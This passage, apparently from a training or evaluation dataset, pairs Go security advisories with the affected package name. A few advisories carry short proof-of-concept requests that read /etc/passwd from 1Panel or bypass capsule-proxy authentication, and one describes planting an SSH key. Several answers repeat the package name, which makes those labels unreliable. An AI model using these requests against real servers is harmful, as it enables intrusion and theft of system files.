\n\nbut also ensure that if the transactions in the block are encoded into bytes, they re-create the exact split in the original block: `|$$$$$$$$$$$$|***********|@@@@@@@@@|%%%%%%%%%%%|`\n\nMore specifically, each transaction in the block is parsed and then re-encoded to bytes, and we check that the original encoding of a transaction is as the second encoding after parsing the original bytes of the transaction.\n\nThis fix keeps the legacy way of hashing transactions to create the block data hash, but also aims to check if some manipulation was done.\n\n \nTo understand why the fix works, we need to understand how protobuf, the wire protocol that Fabric uses to encode transactions (and almost anything it sends over the wire or writes to disk) encodes a transaction.\n\nA transaction is a protobuf message with two fields of bytes: (1) Payload and (2) Signature.\n\nWhen encoding a field of bytes, protobuf first writes a tag for the field (a byte) and then writes the length of the field in variable-length encoding, and then the bytes themselves.\n\nFor example, to encode a transaction, protobuf writes 10 (the tag for payload), then two bytes for the length of the payload, then the payload, and then 18, the tag for the signature, and then a single byte for the length of the signature, and finally the signature.\n\nNow, we can understand a proof sketch of why my solution works:\n\nAssume in contradiction that an adversary takes a block of transactions and changes the split of the concatenation in a way that changes the transactions for a peer:\n\nFrom `|$$$$$$$$$$$$|************|@@@@@@@@@@@|...|%%%%%%%|` to (for example): From `|$$$$$$$$$$$$************|@@@@@@@@@@@|...|%%%%%%%|` \n\nSince this split is not identical to the original split, there exists at least one transaction index of different size between the two splits. Let's look at the first transaction that is of different size.\n\nFor example, for the split:\n\n`|$$$$$$$$$$$$|************|@@@@@@@@@@@|...|%%%%%%%|`  we have two options:\n\n1.  The first transaction of different size is smaller in the new split:  `|$$$$$$$$$$$$|*****|*******|@@@@@@@@@@@|...|%%%%%%%|`  In such a case, it must contain both a payload and a signature, so it needs two fields (we can say we will return an error if one of the two is missing). If the protobuf parser detects it lacks bytes to parse a payload, it will fail with an error. Else, it has enough bytes to parse the payload, and then the signature is parsed. If the signature field is too short then we also error similarly.\n\n2. The first transaction of different size is bigger in the new split: `|$$$$$$$$$$$$|************@@@@|@@@@@@@|...|%%%%%%%|` \nIn that case, once this transaction is parsed, the extra bytes are skipped, so encoding the transaction to bytes yields a shorter byte array, and we detect a tempering.\n\n. Top 1 search result is go:github.com/rclone/rclone. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hyperledger/fabric github.com/hyperledger/fabric."}]}, {"id": "GHSA-9jjc-grg5-67gj", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: A SQL injection vulnerability in Meshery before 0.6.179 allows a remote attacker to obtain sensitive information and execute arbitrary code via the order parameter.. Top 1 search result is go:github.com/sylabs/singularity. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/layer5io/meshery."}]}, {"id": "GHSA-fpvw-6m5v-hqfp", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: The privilege escalation is based on a missing check if the user is authenticated based on the `TokenReview` result.\n\nAll the clusters running with the `anonymous-auth` Kubernetes API Server setting disable (set to `false`) are affected since it would be possible to bypass the token review mechanism, interacting with the upper Kubernetes API Server.\n\n# PoC\n\nStart a KinD cluster with the `anonymous-auth` value to `false`. \nIf it is true, it uses anonymous permissions which are very limited by default\n\n```yaml\nkind: Cluster\napiVersion: kind.x-k8s.io/v1alpha4\nnodes:\n- role: control-plane\n  kubeadmConfigPatches:\n  - |\n    kind: ClusterConfiguration\n    apiServer:\n        extraArgs:\n          anonymous-auth: \"false\"\n```\n\nInstall `capsule` and `capsule-proxy`\n\n```\nk port-forward svc/capsule-proxy 9001    \nForwarding from 127.0.0.1:9001 -> 9001\nForwarding from [::1]:9001 -> 9001\nHandling connection for 9001\n```\n\nThen query the proxy\n```\ncurl -g -k -H 'Authorization: Bearer   f' -X 'GET' 'https://localhost:9001/api/v1/namespaces'\n```\n\n# Impact\n\nThe whole cluster is exposed to unauthorised users.\n\nThis privilege escalation cannot be exploited if you're relying only on client certificates (SSL/TLS).. Top 1 search result is go:gogs.io/gogs. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/projectcapsule/capsule-proxy github.com/clastix/capsule-proxy."}]}, {"id": "GHSA-hq6q-c2x6-hmch", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: A security issue was discovered in Kubernetes where a user that can create pods and persistent volumes on Windows nodes may be able to escalate to admin privileges on those nodes. Kubernetes clusters are only affected if they are using an in-tree storage plugin for Windows nodes.. Top 1 search result is go:github.com/holiman/uint256. What is the affected package?"}, {"from": "gpt", "value": "The affected package is k8s.io/kubernetes k8s.io/kubernetes k8s.io/kubernetes k8s.io/kubernetes."}]}, {"id": "GHSA-876p-8259-xjgg", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nA malicious peer can use large RSA keys to run a resource exhaustion attack & force a node to spend time doing signature verification of the large key. This vulnerability is present in the core/crypto module of go-libp2p and can occur during the Noise handshake and the libp2p x509 extension verification step.\nTo prevent this attack, go-libp2p now restricts RSA keys to <= 8192 bits.\n\n### Patches\nUsers should upgrade their go-libp2p versions to >=v0.27.8, >= v0.28.2, or >=v0.29.1\nTo protect your application, it's necessary to update to these patch releases **AND** to use the updated Go compiler (1.20.7 or 1.19.12, respectively)\n\n### Workarounds\nThere are no known workarounds\n\n### References\nThe Golang crypto/tls package also had this vulnerability (\"verifying certificate chains containing large RSA keys is slow\u201d https://github.com/golang/go/issues/61460)\nFix in golang/go crypto/tls: https://github.com/golang/go/commit/2350afd2e8ab054390e284c95d5b089c142db017\nFix in quic-go https://github.com/quic-go/quic-go/pull/4012\n. Top 1 search result is go:github.com/hashicorp/nomad. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/libp2p/go-libp2p github.com/libp2p/go-libp2p github.com/libp2p/go-libp2p."}]}, {"id": "GHSA-v9vc-7x69-c2x8", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Missing Authorization in GitHub repository answerdev/answer prior to v1.1.1.. Top 1 search result is go:github.com/hashicorp/vault. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-ch6w-mc6c-g65g", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-8697-479h-5mfp. This link is maintained to preserve external references.\n\n## Original Description\nAn issue in weaviate v.1.20.0 allows a remote attacker to cause a denial of service via the `handleUnbatchedGraphQLRequest` function.. Top 1 search result is go:github.com/ethereum/go-ethereum. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/weaviate/weaviate."}]}, {"id": "GHSA-pv7q-v9mv-9mh5", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\nArbitrary file reads allow an attacker to read arbitrary important configuration files on the server.\n\n### Details\nIn the api/v1/file.go file, there is a function called LoadFromFile, which directly reads the file by obtaining the requested path parameter[path]. The request parameters are not filtered, resulting in a background arbitrary file reading vulnerability\n![picture1](https://user-images.githubusercontent.com/136411443/257109786-1b0af1e7-346f-4e92-9da2-d977f2f7fe6a.jpg)\n\n### PoC\nRequest /api/v1/files/loadfile, carry /etc/passwd data to read, as shown below:\n![\u5fae\u4fe1\u56fe\u7247_20230731112833](https://user-images.githubusercontent.com/136411443/257109931-108fc16f-e180-4d1e-996c-d9da5f76559f.png)\n\n\n### Impact\n1Panel v1.4.3\n. Top 1 search result is go:github.com/tyktechnologies/tyk-identity-broker. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/1Panel-dev/1Panel."}]}, {"id": "GHSA-85cf-gj29-f555", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\nAny file downloading vulnerability exists in 1Panel backend.\n\n### Details\nAuthenticated attackers can download arbitrary files through the API interface. This code has unauthorized access.\n![image](https://user-images.githubusercontent.com/116613486/257246024-d0e35800-5fd8-4907-8b1b-504afaad859e.png)\n\n### PoC\npayload:\n\nPOST /api/v1/files/download/bypath HTTP/1.1\nHost: ip\nContent-Type: application/json\n\n{\"path\":\"/etc/passwd\"}\n\n![f77959349e96543436eea18283fa75c](https://user-images.githubusercontent.com/116613486/257245459-13f2f31b-fcfe-4a27-ba52-e2f1e5d4d749.png)\n\n\n### Impact\nAttackers can freely download the file content on the target system. This will be caused a large amount of information leakage.\n. Top 1 search result is go:github.com/dutchcoders/transfer.sh. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/1Panel-dev/1Panel."}]}, {"id": "GHSA-826j-8wp2-4x6q", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nA Mass assignment vulnerability was found allowing a non-admin user to escalate privileges to admin user.\n\n### Patches\nIssue is patched in 0.17.1, and fixed in 0.18.6+.\n\nIf Users are using 0.17.1, they should run \"docker pull gravitl/netmaker:v0.17.1\" and \"docker-compose up -d\". This will switch them to the patched users\n\nIf users are using v0.18.0-0.18.5, they should upgrade to v0.18.6 or later.\n\n### Workarounds\nIf using 0.17.1, can just pull the latest docker image of backend and restart server.\n\n### References\nCredit to Project Discovery, and in particular https://github.com/rootxharsh , https://github.com/iamnoooob, and https://github.com/projectdiscovery. Top 1 search result is go:github.com/russellhaering/goxmldsig. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/gravitl/netmaker github.com/gravitl/netmaker."}]}, {"id": "GHSA-3r32-cp7v-5wq4", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: An issue in ansible semaphore v.2.8.90 allows a remote attacker to execute arbitrary code via a crafted payload to the extra variables parameter.. Top 1 search result is go:github.com/apache/trafficcontrol. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/ansible-semaphore/semaphore."}]}, {"id": "GHSA-xvhg-w6qc-m3qq", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nThe Yak Engine has been found to contain a local file inclusion (LFI) vulnerability. This vulnerability allows attackers to include files from the server's local file system through the web application. When exploited, this can lead to the unintended exposure of sensitive data, potential remote code execution, or other security breaches. Users utilizing versions of the Yak Engine prior to 1.2.4-sp1 are impacted.\n\n### Patches\n\nThe vulnerability has been addressed and patched. Users are advised to upgrade to Yak Engine version 1.2.4-sp1 immediately. The patch can be viewed and reviewed at this PR: [https://github.com/yaklang/yaklang/pull/295](https://github.com/yaklang/yaklang/pull/295)\uff0c[https://github.com/yaklang/yaklang/pull/296](https://github.com/yaklang/yaklang/pull/296)\n\n### Workarounds\n\nCurrently, the most effective solution is to upgrade to the patched version of Yak Engine (1.2.4-sp1). Users are also advised to avoid exposing vulnerable versions to untrusted input and to closely monitor any unexpected server behavior until they can upgrade.\n\n### References\n\nFor more details on the vulnerability and the corresponding patch, please visit the following link:\n- [PR addressing the LFI vulnerability in Yak Engine](https://github.com/yaklang/yaklang/pull/295)\n- [disable default file fuzztag in fuzz.Pool](https://github.com/yaklang/yaklang/pull/296)\n- [\u5229\u7528yakit\u529f\u80fd\u7279\u6027\u6eaf\u6e90\u653b\u51fb\u8005](https://mp.weixin.qq.com/s?__biz=Mzg5ODE3NTU1OQ==&mid=2247484236&idx=1&sn=ef0c14a89721800b2311d0e487388399). Top 1 search result is go:github.com/gin-gonic/gin. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/yaklang/yaklang."}]}, {"id": "GHSA-9rww-66w7-7vjx", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to sanitize post metadata during audit logging, resulting in permalinks' contents being logged.\n. Top 1 search result is go:github.com/ovn-org/ovn-kubernetes. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost-server/v6 github.com/mattermost/mattermost-server/v6 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-jcf2-mxr2-gmqp", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ## Overview\nSome end users of OpenFGA v1.3.0 or earlier are vulnerable to authorization bypass when calling the ListObjects API. UPDATE: This means that the API sometimes returns more objects than it should.\n\n## Am I Affected?\n\nThe vulnerability affects customers using `ListObjects` with specific models. The affected models contain expressions of type `rel1 from type1`.\n\n## Fix\nUpdate to v1.3.1.\n\n## Backward Compatibility\nThis update is backward compatible.\n. Top 1 search result is go:github.com/dutchcoders/transfer.sh. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/openfga/openfga."}]}, {"id": "GHSA-j3p8-6mrq-6g7h", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: A maliciously-crafted image can cause excessive CPU consumption in decoding. A tiled image with a height of 0 and a very large width can cause excessive CPU consumption, despite the image size (width * height) appearing to be zero.. Top 1 search result is go:github.com/whyrusleeping/tar-utils. What is the affected package?"}, {"from": "gpt", "value": "The affected package is golang.org/x/image."}]}, {"id": "GHSA-9phh-r37v-34wh", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nThe browser renders the resulting HTML when opening a direct link to an HTML file via lakeFS. Any JavaScript within that page is executed within the context of the domain lakeFS is running in.  \nAn attacker can inject a malicious script inline, download resources from another domain, or make arbitrary HTTP requests. This would allow the attacker to send information to a random domain or carry out lakeFS operations while impersonating the victim.  \n\nNote that to carry out this attack, an attacker must already have access to upload the malicious HTML file to one or more repositories. It also depends on the victim receiving and opening the link to the malicious HTML file.\n\n### Patches\nThis is fixed in lakeFS version 0.106.0\n\n### Workarounds\nThere are no known workarounds at this time.\n. Top 1 search result is go:gogs.io/gogs. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/treeverse/lakefs."}]}, {"id": "GHSA-hf7j-xj3w-87g4", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: # Summary\nAn arbitrary file write vulnerability could lead to direct control of the server\n# Details\n## Arbitrary file creation\nIn the api/v1/file.go file, there is a function called SaveContentthat,It recieves JSON data sent by users in the form of a POST request. And the lack of parameter filtering allows for arbitrary file write operations.It looks like this:\n\n- Vulnerable Code\n\n![\u5fae\u4fe1\u56fe\u7247_20230801092544](https://user-images.githubusercontent.com/136411443/257381095-4d7c014b-b699-4152-8b9d-2cc9399dfd85.png)\n\n# PoC\n\n- We can write the SSH public key into the /etc/.root/authorized_keys configuration file on the server.\n\n![\u5fae\u4fe1\u56fe\u7247_20230801093243](https://user-images.githubusercontent.com/136411443/257381907-38784fab-77b9-47b9-a598-44ef7ad0b65c.png)\n\n- The server was successfully written to the public key\n![\u5fae\u4fe1\u56fe\u7247_20230801093610](https://user-images.githubusercontent.com/136411443/257382468-b4836eee-f751-4b43-93ff-cb39fdc6c809.png)\n\n- Successfully connected to the target server using an SSH private key.\n![\u5fae\u4fe1\u56fe\u7247_20230801093933](https://user-images.githubusercontent.com/136411443/257383031-53f1e5de-2743-48ed-a1cf-9a5ea0c0f90b.png)\n![\u5fae\u4fe1\u56fe\u7247_20230801094037](https://user-images.githubusercontent.com/136411443/257383041-d9f64647-95d9-4711-8b9f-e152966537c9.png)\n\nAs a result, the server is directly controlled, causing serious **harm**\n\n\n# Impact\n1Panel v1.4.3\n. Top 1 search result is go:github.com/square/go-jose. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/1Panel-dev/1Panel."}]}, {"id": "GHSA-52h8-c876-989c", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Race Condition within a Thread in GitHub repository answerdev/answer prior to v1.1.1.. Top 1 search result is go:github.com/cortexproject/cortex. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-8697-479h-5mfp", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nThis vulnerability is a type conversion issue that affects users of Weaviate Server versions 1.20.0 and earlier.\nWho is impacted: Users of Weaviate Server versions 1.20.0 and earlier are impacted by this vulnerability.\n\n### Patches\nA patch has been developed for this vulnerability.\nPatch releases 1.20.6, 1.19.13, and 1.18.6 are fixing this vulnerability in each respective minor version release.\nUsers are strongly recommended to upgrade to one of these patched versions to address the vulnerability.\nKeeping software up-to-date is crucial to avoid security vulnerabilities.\n\n### Workarounds\nThere are no known workarounds to fix or remediate this vulnerability without upgrading.\nUsers must upgrade to a patched version to mitigate the risk.\n\n### References \n* https://github.com/weaviate/weaviate/releases/tag/v1.18.6\n* https://github.com/weaviate/weaviate/releases/tag/v1.19.13\n* https://github.com/weaviate/weaviate/releases/tag/v1.20.6\n. Top 1 search result is go:gogs.io/gogs. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/weaviate/weaviate github.com/weaviate/weaviate github.com/weaviate/weaviate."}]}, {"id": "GHSA-6xjj-v76v-fwpj", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to properly validate the requesting user permissions when updating a system admin, allowing a user manager to update a system admin's details such as email, first name and last name.\n\n. Top 1 search result is go:github.com/helm/helm. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost-server/v6 github.com/mattermost/mattermost-server/v6 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-65rp-cv85-263x", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Etcd v3.5.4 allows remote attackers to cause a denial of service via function PageWriter.write in pagewriter.go. Top 1 search result is go:github.com/gohugoio/hugo. What is the affected package?"}, {"from": "gpt", "value": "The affected package is go.etcd.io/etcd/v3."}]}, {"id": "GHSA-g3v6-r8p9-wxg9", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to delete the attachments when deleting a message in a thread allowing a simple user to still be able to access and download the attachment of a deleted message\n\n. Top 1 search result is go:github.com/evmos/evmos. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost-server/v6 github.com/mattermost/mattermost-server/v6 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-ggcf-hwxp-rc77", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Insufficient Session Expiration in GitHub repository answerdev/answer prior to v1.1.0.. Top 1 search result is go:github.com/rancher/rancher. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-2xx4-jj5v-6mff", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ## Overview\n\nWe have identified and addressed a security issue in the Nuclei project that affected users utilizing Nuclei as **Go code (SDK)** running **custom templates**. This issue did not affect CLI users. The problem was related to sanitization issues with payloads loading in `sandbox` mode.\n\n## Details\n\nIn the previous versions, there was a potential risk with payloads loading in sandbox mode. The issue occurred due to relative paths not being converted to absolute paths before doing the check for `sandbox` flag allowing arbitrary files to be read on the filesystem in certain cases when using Nuclei from `Go` SDK implementation. \n\nThis issue has been fixed in the latest release, v2.9.9. We have also enabled sandbox by default for filesystem loading. This can be optionally disabled if required.\n\nThe `-sandbox` option has been **deprecated** and is now divided into two new options: `-lfa` (allow local file access) which is disabled by default and `-lna` (restrict local network access) which can be optionally disabled by user. The `-lfa` allows file (payload) access anywhere on the system (disabling sandbox effectively), and `-lna` blocks connections to the local/private network.\n\n## Affected Versions\n\nThis issue affected all versions of Nuclei prior to v2.9.9.\n\n## Patches\n\nWe recommend all users upgrade to the latest version, [v2.9.9](https://github.com/projectdiscovery/nuclei/releases/tag/v2.9.9), which includes the security fix.\n\n### References\n\n- [patch](https://github.com/projectdiscovery/nuclei/pull/3927)\n- [releases](https://github.com/projectdiscovery/nuclei/releases/tag/v2.9.9)\n\n## Acknowledgments\n\nWe would like to thank **keomutchoiboi** who reported this issue to us via our security email, [security@projectdiscovery.io](mailto:security@projectdiscovery.io). We appreciate the responsible disclosure of this issue.. Top 1 search result is go:github.com/hashicorp/consul. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/projectdiscovery/nuclei/v2 github.com/projectdiscovery/nuclei."}]}, {"id": "GHSA-gcq9-qqwx-rgj3", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\nIn go-libp2p, by using signed peer records a malicious actor can store an arbitrary amount of data in a remote node\u2019s memory. This memory does not get garbage collected and so the victim can run out of memory and crash.\n\nIt is feasible to do this at scale. An attacker would have to transfer ~1/2 as much memory it wants to occupy (2x amplification factor).\n\nThe attacker can perform this attack over time as the target node\u2019s memory will not be garbage collected.\n\nThis can occur because when a signed peer record is received, only the signature validity check is performed but the sender signature is not checked. Signed peer records from randomly generated peers can be sent by a malicious actor. A target node will accept the peer record as long as the signature is valid, and then stored in the peer store.\n\nThere is cleanup logic in the peer store that cleans up data when a peer disconnects, but this cleanup is never triggered for the fake peer (from which signed peer records were accepted) because it was never \u201cconnected\u201d.\n\n### Impact\nIf users of go-libp2p in production are not monitoring memory consumption over time, it could be a silent attack i.e. the attacker could bring down nodes over a period of time (how long depends on the node resources i.e. a go-libp2p node on a virtual server with 4 gb of memory takes about 90 sec to bring down; on a larger server, it might take a bit longer.)\n\n### Patches\nUpdate your go-libp2p dependency to the latest release, v0.30.0 at the time of writing.\n\nIf you'd like to stay on the 0.27.x release, we strongly recommend users to update to go-libp2p [0.27.7](https://github.com/libp2p/go-libp2p/releases/tag/v0.27.7). Though this OOM issue was fixed in 0.27.4, there were subsequent patch releases afterwards (important fixes for other issues unrelated to the OOM).\n\n### Workarounds\nNone. Top 1 search result is go:github.com/kiali/kiali. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/libp2p/go-libp2p."}]}, {"id": "GHSA-256m-j5qw-38f4", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nAn IDOR vulnerability was found in the user update function. By specifying another user's username it is possible to update the other user's password.\n\n### Patches\nIssue is patched in 0.17.1, and fixed in 0.18.6+.\n\nIf Users are using 0.17.1, they should run \"docker pull gravitl/netmaker:v0.17.1\" and \"docker-compose up -d\". This will switch them to the patched users\n\nIf users are using v0.18.0-0.18.5, they should upgrade to v0.18.6 or later.\n\n### Workarounds\nIf using 0.17.1, can just pull the latest docker image of backend and restart server.\n\n### References\nCredit to Project Discovery, and in particular https://github.com/rootxharsh , https://github.com/iamnoooob, and https://github.com/projectdiscovery. Top 1 search result is go:github.com/grafana/grafana. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/gravitl/netmaker github.com/gravitl/netmaker."}]}, {"id": "GHSA-4gcf-5m39-98mc", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nAn attacker can post malformed webhook data which leads to an update of the repository data that can e.g. allow the takeover of a repository.\nThis is only critical if the CI is configured for public usage and connected to a forge witch is also in public usage.\n\n### Patches\nPlease use either next or the latest v1.0 e.g. v1.0.2\n\n### Workarounds\nSecure the CI system by making it inaccessible to untrusted entities, for example, by placing it behind a firewall.\n\n### References\nFix: https://github.com/woodpecker-ci/woodpecker/pull/2221\nBackport: https://github.com/woodpecker-ci/woodpecker/pull/2222. Top 1 search result is go:github.com/lima-vm/lima. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/woodpecker-ci/woodpecker."}]}, {"id": "GHSA-9v3w-w2jh-4hff", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: HashiCorp's Vault and Vault Enterprise are vulnerable to user enumeration when using the LDAP auth method. An attacker may submit requests of existent and non-existent LDAP users and observe the response from Vault to check if the account is valid on the LDAP server. This vulnerability is fixed in Vault 1.14.1 and 1.13.5.. Top 1 search result is go:github.com/ory/oathkeeper. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/vault github.com/hashicorp/vault."}]}, {"id": "GHSA-c8xw-vjgf-94hr", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nAll versions of Argo CD starting from v2.6.0 have a bug where open web terminal sessions do not expire. This bug allows users to send any websocket messages even if the token has already expired. The most straightforward scenario is when a user opens the terminal view and leaves it open for an extended period. This allows the user to view sensitive information even when they should have been logged out already.\n\n### Patches\nA patch for this vulnerability has been released in the following Argo CD version:\n\n* v2.6.14\n* v2.7.12\n* v2.8.1\n\n### Workarounds\nThe only way to completely resolve the issue is to upgrade.\n\n#### Mitigations\nDisable web-based terminal or define RBAC rules to it\n[https://argo-cd.readthedocs.io/en/latest/operator-manual/web_based_terminal/](https://argo-cd.readthedocs.io/en/latest/operator-manual/web_based_terminal/)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n\n### Credits\n\nThank you to bean.zhang (@zhlu32 ) of HIT-IDS ChunkL Team who discovered the issue and reported it confidentially according to our [guidelines](https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability).. Top 1 search result is go:github.com/russellhaering/gosaml2. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/argoproj/argo-cd github.com/argoproj/argo-cd github.com/argoproj/argo-cd."}]}, {"id": "GHSA-2wrh-6pvc-2jm9", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Text nodes not in the HTML namespace are incorrectly literally rendered, causing text which should be escaped to not be. This could lead to an XSS attack. . Top 1 search result is go:github.com/kiali/kiali. What is the affected package?"}, {"from": "gpt", "value": "The affected package is golang.org/x/net."}]}, {"id": "GHSA-x92r-3vfx-4cv3", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: The TIFF decoder does not place a limit on the size of compressed tile data. A maliciously-crafted image can exploit this to cause a small image (both in terms of pixel width/height, and encoded size) to make the decoder decode large amounts of compressed data, consuming excessive memory and CPU.. Top 1 search result is go:github.com/tidwall/gjson. What is the affected package?"}, {"from": "gpt", "value": "The affected package is golang.org/x/image."}]}, {"id": "GHSA-j63x-f657-2m9g", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Weak Password Requirements in GitHub repository answerdev/answer prior to v1.1.0.. Top 1 search result is go:github.com/heketi/heketi. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-8c37-7qx3-4c4p", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nBlst versions v0.3.0 through 0.3.10 failed to perform a signature group-check if the call to `SigValidate` in the Go bindings was complemented with a check for infinity. Formally speaking, infinity, or the identity element of the elliptic curve group, is a member of the group, and the group-check should allow it. An initial review of blst users on GitHub did not uncover any use of this function with the complementary infinity check. This optional check was added as a convenience feature because despite infinity being a legitimate member of the group, individual signatures should never be infinite (as it is equivalent to having zero for the secret key), and observing one should raise a flag. \n\n### Description\n\nThe vulnerable function is declared as `SigValidate(sigInfcheck bool) bool` and if called with `sigInfcheck` argument set to `true`, the group-check was omitted. The group-check is required to be performed on untrusted input, because the pairing, the corner-stone operation of the signature scheme, is defined only on points that are members of a specific cyclic group, which is a subset of all the possible points on elliptic curves in question. Submitting an untrusted point outside the group opens up the possibility of accepting an alternative signature for a chosen message.\n\nIt should be noted that the SigValidate call is not the only way to perform the group-checks. There are optional checks integrated into various other verification methods, such as `Verify`, `AggregateVerify`, etc., as well as signature aggregation methods, such as `PairingAggregate*`. The reason why there are multiple options is that the group-check is a relatively expensive operation, and application developers are arguably entitled the freedom to choose when it's performed.\n\n### Patches\n\nThis issue has been resolved in the v0.3.11 release and users are advised to update if their application is affected or alternatively omit the complementary infinity check.\n\n### Credits\n\nA special thanks to Yunjong Jeong (@blukat29) for the discovery and disclosure of this vulnerability.\n. Top 1 search result is go:github.com/pterodactyl/wings. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/supranational/blst."}]}, {"id": "GHSA-p267-jjfq-pphf", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to check if the requesting user is a guest before performing different actions to public playbooks, resulting a guest being able to\u00a0view, join, edit, export and archive public playbooks.\n\n. Top 1 search result is go:github.com/binance-chain/tss-lib. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost-server/v6 github.com/mattermost/mattermost-server/v6 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-v86x-5fm3-5p7j", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nAn attacker with the permission to perform POST requests on the /api/v1/alerts endpoint could be able to execute arbitrary JavaScript code on the users of Prometheus Alertmanager.\n\n### Patches\n\nUsers can upgrade to Alertmanager v0.2.51.\n\n### Workarounds\n\nUsers can setup a reverse proxy in front of the Alertmanager web server to forbid access to the /api/v1/alerts endpoint.\n\n### References\n\nN/A\n. Top 1 search result is go:github.com/Kava-Labs/kava. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/prometheus/alertmanager."}]}, {"id": "GHSA-rq5c-hvw6-8pr7", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nONLY IMPACTS those use GitHub Status Notifications\n\nLog output when updating GitHub status is improperly set to FULL always.  It's recommended to apply the patch and rotate the GitHub token used for github status notifications.  Given that this would output github tokens to a log system, the risk is slightly higher than a \"low\" since token exposure could grant elevated access to repositories outside of control.  If using READ restricted tokens, the exposure is such that the token itself could be used to access resources otherwise restricted from 